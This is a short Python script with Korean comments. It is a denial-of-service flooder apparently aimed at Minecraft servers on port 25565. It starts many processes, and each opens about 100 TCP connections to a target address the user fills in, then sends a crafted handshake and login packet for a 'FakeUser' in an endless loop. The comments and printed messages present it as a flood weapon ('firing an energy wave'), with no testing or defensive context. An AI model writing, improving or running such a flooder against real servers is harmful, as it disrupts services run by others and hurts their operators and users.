import socket
import multiprocessing
import time

target_host = "127.0.0.1"  # 이 부분에 타겟 주소를 적으세요
target_port = 25565
process_count = multiprocessing.cpu_count() * 5

def create_raw_packet():
    # 주소를 바이트로 변환하고 길이를 계산하여 패킷을 조립합니다.
    host_bytes = target_host.encode('utf-8')
    return b'\x15\x00\xfb\x05' + bytes([len(host_bytes)]) + host_bytes + b'\x63\x64\x02\x15\x00\tFakeUser\x00'


def ultra_burst(start_signal):
    packet = create_raw_packet()
    start_signal.wait()  # 모든 프로세스 동시 출발 신호

    sockets = []
    # 1단계: 미리 100개의 소켓을 연결해둠 (연결 확보)
    for _ in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # 지연 방지
            s.settimeout(1.0)
            s.connect((target_host, target_port))
            sockets.append(s)
        except:
            continue

    # 2단계: 확보된 소켓들에 무한 연사
    while True:
        for s in sockets:
            try:
                s.send(packet)  # 미친 듯이 패킷 주입
            except:
                sockets.remove(s)  # 끊긴 소켓은 제거
                break


if __name__ == "__main__":
    manager = multiprocessing.Manager()
    start_signal = manager.Event()

    print(f"[*] 500Mbps 모드 가동 중... 프로세스 {process_count}개 생성")

    pool = []
    for _ in range(process_count):
        p = multiprocessing.Process(target=ultra_burst, args=(start_signal,))
        p.start()
        pool.append(p)

    time.sleep(5)  # 엔진 예열
    print("🔥 에너지파 발사!!! 작업 관리자를 확인하세요.")
    start_signal.set()

    for p in pool:
        p.join()
